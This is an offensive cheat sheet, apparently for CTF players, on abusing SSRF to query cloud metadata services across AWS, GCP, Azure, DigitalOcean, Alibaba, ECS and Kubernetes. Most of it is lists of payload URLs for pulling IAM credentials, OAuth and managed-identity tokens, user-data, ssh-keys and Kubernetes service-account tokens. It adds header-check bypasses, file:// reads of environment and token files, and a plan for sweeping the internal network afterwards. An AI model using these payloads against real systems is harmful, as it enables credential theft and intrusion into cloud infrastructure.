# Cloud metadata — the 169.254.169.254 playbook

The link-local metadata service — instance identity, IAM creds,
user-data (FLAG LIVES HERE most often), network config. Each
provider's shape differs; the probes differ with it.

---

## 1. AWS — the v1 vs v2 split

### IMDSv2 — the token gate (current default on hardened AMIs)

```text
PUT http://169.254.169.254/latest/api/token
    X-aws-ec2-metadata-token-ttl-seconds: 21600
→ returns a token → then:
GET http://169.254.169.254/latest/meta-data/
    X-aws-ec2-metadata-token: <token>
```

SSRF angle: most fetchers send GET — the PUT for the token usually
can't be made → **IMDSv2 blocks the classic SSRF**. UNLESS:

- the fetcher follows a redirect → 302 to `.../latest/meta-data/`
  still needs the token — no
- the fetcher lets you control METHOD+headers — rare
- IMDSv1 still enabled (`HttpTokens=optional`) — CTF shapes leave
  it on → plain GET works
- **hop-by-hop header trick**: some fetchers forward YOUR headers —
  send `X-aws-ec2-metadata-token-ttl-seconds` upstream — if the
  app forwards it to its own fetch... rare but the chain exists

### IMDSv1 — the classic

```text
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/instance-type
http://169.254.169.254/latest/meta-data/local-hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/mac
http://169.254.169.254/latest/meta-data/placement/availability-zone
http://169.254.169.254/latest/meta-data/placement/region
http://169.254.169.254/latest/meta-data/security-groups
http://169.254.169.254/latest/meta-data/iam/
http://169.254.169.254/latest/meta-data/iam/info
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
   → AccessKeyId + SecretAccessKey + Token — AWS creds!
http://169.254.169.254/latest/user-data
   → the bootstrap script — FLAG/SECRETS LIVE HERE — CTF norm
http://169.254.169.254/latest/dynamic/instance-identity/document
   → signed identity doc — account-id/region/instance-id
http://169.254.169.254/latest/dynamic/instance-identity/signature
http://169.254.169.254/latest/dynamic/instance-identity/pkcs7
http://169.254.169.254/latest/meta-data/events/
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info
http://169.254.169.254/latest/meta-data/network/interfaces/macs/
http://169.254.169.254/latest/meta-data/network/interfaces/macs/<mac>/subnet-id
http://169.254.169.254/latest/meta-data/network/interfaces/macs/<mac>/vpc-id
http://169.254.169.254/latest/meta-data/network/interfaces/macs/<mac>/security-group-ids
http://169.254.169.254/latest/meta-data/network/interfaces/macs/<mac>/local-ipv4s
http://169.254.169.254/latest/meta-data/services/domain
http://169.254.169.254/latest/meta-data/services/partition
http://169.254.169.254/latest/meta-data/block-device-mapping/
http://169.254.169.254/latest/meta-data/ipv6
http://169.254.169.254/latest/meta-data/metrics/vhostmd
```

The two gold paths: `user-data` (bootstrap-script flags) and
`iam/security-credentials/<role>` (stealable AWS creds → S3 etc).

## 2. GCP — the `Metadata-Flavor` gate

```text
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/
   — all need header: Metadata-Flavor: Google
   — header-less fetchers get 403 — UNLESS:
     http://metadata.google.internal/computeMetadata/v1beta1/
       — v1beta1 endpoint — header check weaker/absent!
     the beta-endpoint trick — the standard GCP bypass
```

Full map:

```text
/computeMetadata/v1/instance/hostname
/computeMetadata/v1/instance/id
/computeMetadata/v1/instance/image
/computeMetadata/v1/instance/machine-type
/computeMetadata/v1/instance/name
/computeMetadata/v1/instance/zone
/computeMetadata/v1/instance/network-interfaces/
/computeMetadata/v1/instance/network-interfaces/0/ip
/computeMetadata/v1/instance/network-interfaces/0/access-configs/
/computeMetadata/v1/instance/network-interfaces/0/forwarded-ips/
/computeMetadata/v1/instance/attributes/
/computeMetadata/v1/instance/attributes/<key>      — custom attrs — flag?
/computeMetadata/v1/instance/attributes/ssh-keys   — ssh-keys!
/computeMetadata/v1/instance/service-accounts/
/computeMetadata/v1/instance/service-accounts/default/
/computeMetadata/v1/instance/service-accounts/default/email
/computeMetadata/v1/instance/service-accounts/default/scopes
/computeMetadata/v1/instance/service-accounts/default/token
   → OAuth access-token — GCP creds!
/computeMetadata/v1/instance/service-accounts/default/identity
/computeMetadata/v1/instance/cpu-platform
/computeMetadata/v1/instance/scheduling/
/computeMetadata/v1/instance/tags
/computeMetadata/v1/project/
/computeMetadata/v1/project/project-id
/computeMetadata/v1/project/numeric-project-id
/computeMetadata/v1/project/attributes/
/computeMetadata/v1/project/attributes/<key>
/computeMetadata/v1/project/attributes/ssh-keys
/computeMetadata/v1/project/attributes/startup-script    — flag-shaped!
/computeMetadata/v1/project/attributes/shutdown-script
/computeMetadata/v1/instance/attributes/startup-script   — flag-shaped!
/computeMetadata/v1/oslogin/
/computeMetadata/v1/guest-attributes/
/computeMetadata/v1/instance/attributes/kube-env         — GKE-env — secrets!
?recursive=true&alt=json — whole-tree dump — try first!
/computeMetadata/v1/?recursive=true
/computeMetadata/v1/instance/?recursive=true&alt=json
```

`?recursive=true` — the full-tree in one fetch — grab everything.

## 3. Azure — the `Metadata: true` gate

```text
http://169.254.169.254/metadata/instance?api-version=2021-02-01
    — needs header Metadata: true
http://169.254.169.254/metadata/instance/compute?api-version=...
http://169.254.169.254/metadata/instance/compute/name?api-version=...
http://169.254.169.254/metadata/instance/compute/resourceGroupName?...
http://169.254.169.254/metadata/instance/compute/subscriptionId?...
http://169.254.169.254/metadata/instance/compute/vmId?...
http://169.254.169.254/metadata/instance/compute/location?...
http://169.254.169.254/metadata/instance/network?api-version=...
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
    → managed-identity token — Azure creds!
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com
http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01
http://169.254.169.254/metadata/attested/document?api-version=...
```

## 4. The other clouds — quick table

| Provider | Endpoint | Header needed | Gold path |
|---|---|---|---|
| AWS | 169.254.169.254/latest/ | (v2: token) | user-data, iam/security-credentials |
| GCP | metadata.google.internal/computeMetadata/v1/ | Metadata-Flavor: Google (v1beta1 bypass) | service-accounts/.../token, startup-script, kube-env |
| Azure | 169.254.169.254/metadata/instance | Metadata: true | identity/oauth2/token |
| DigitalOcean | 169.254.169.254/metadata/v1/ | none | /metadata/v1/user-data, /metadata/v1.json |
| Alibaba | 100.100.100.200/latest/meta-data/ | none | ram/security-credentials/, user-data |
| Oracle | 169.254.169.254/opc/v1/ | Authorization: Bearer Oracle | instance/, userData? |
| OpenStack | 169.254.169.254/openstack/latest/ | none | meta_data.json, user_data |
| Packet/Equinix | metadata.packet.net/ | none | userdata |
| Hetzner | 169.254.169.254/hetzner/v1/ | none | userdata, metadata |
| Linode | 169.254.169.254/v1/ | none | lish?, configs |
| Vultr | 169.254.169.254/v1/ | none | user-data, startup-scripts? |
| Kubernetes | 169.254.169.254 or the API directly | SA-token file | env has the token usually |
| ECS/Fargate | 169.254.170.2/v2/metadata | none | the task-metadata endpoint |
| ECS creds | 169.254.170.2 + $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | none | the task-role creds! |

### DigitalOcean detail
```text
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/user-data          — the flag path
http://169.254.169.254/metadata/v1/droplet_id
http://169.254.169.254/metadata/v1/interfaces/
http://169.254.169.254/metadata/v1/dns/nameservers
http://169.254.169.254/metadata/v1/tags
http://169.254.169.254/metadata/v1/auth_key
http://169.254.169.254/metadata/v1.json               — full json dump
```

### Alibaba detail
```text
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/ram/security-credentials/
http://100.100.100.200/latest/meta-data/ram/security-credentials/<role>
http://100.100.100.200/latest/user-data
http://100.100.100.200/latest/meta-data/network/
http://100.100.100.200/latest/meta-data/region-id
http://100.100.100.200/latest/meta-data/zone-id
```

### ECS/Fargate — the container-metadata
```text
http://169.254.170.2/v2/metadata          — task-metadata — image/env/net
http://169.254.170.2/v2/metadata/task
http://169.254.170.2/v2/stats
http://169.254.170.2/v3/metadata          — v3
http://169.254.170.2/v4/metadata          — v4
http://169.254.170.2<creds-relative-uri>   — AWS_CONTAINER_CREDENTIALS_
                                              RELATIVE_URI — env-var —
                                              gives the task-role creds!
   — the env-var is in /proc/self/environ or the app's env —
     file://-read it first → then fetch the full creds URL
```

## 5. Kubernetes — the service-account path

```text
/var/run/secrets/kubernetes.io/serviceaccount/token  — file-read!
/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
/var/run/secrets/kubernetes.io/serviceaccount/namespace
then:
https://kubernetes.default.svc/api/v1/namespaces/x/secrets
https://kubernetes.default.svc.cluster.local/api/v1/secrets
https://kubernetes/api/v1/secrets
http://kubernetes/...
   — with the SA-token → the k8s-api → secrets-listing → flag
```

The SA-token is a file — `file://` SSRF reads it even when HTTP-
SSRF can't reach the API. Two-stage: file-read token → api-call.

## 6. The flag-location priority — where CTF flags live

```text
1. user-data (all providers) — the bootstrap script — #1 by far
2. startup-script attrs (GCP project/instance attributes)
3. iam/security-credentials — stealable role → the real cloud
4. kube-env (GKE) — env-blob with secrets
5. metadata.service-accounts — tokens
6. custom attributes (gcp project/instance attributes named flag)
7. tags — sometimes flag-as-tag
8. ssh-keys — key material → lateral
```

`user-data` first, always — it's a script the machine ran at
boot — CTF authors put the flag in it.

## 7. The internal-network pivot — after metadata

```text
metadata tells you:
  - the VPC/subnet CIDR → which internal IPs to spray
  - the security-groups → which ports the app-thinks-are-open
  - other instance IPs (if enumerable)
  - the region/AZ → where the siblings live
```

`local-ipv4` + the subnet → `ssrf_probe --ports` sweep against
the neighbors — metadata is recon for the internal sweep.

## 8. The no-cloud falsifier

```text
169.254.169.254 → timeout/refused → NOT cloud — or IMDSv2 — or
  egress-blocked — check /proc/self/cgroup + /etc/resolv.conf via
  file:// first — docker/k8s markers mean "not real cloud" —
  then the flag is a file/env-var not metadata
```
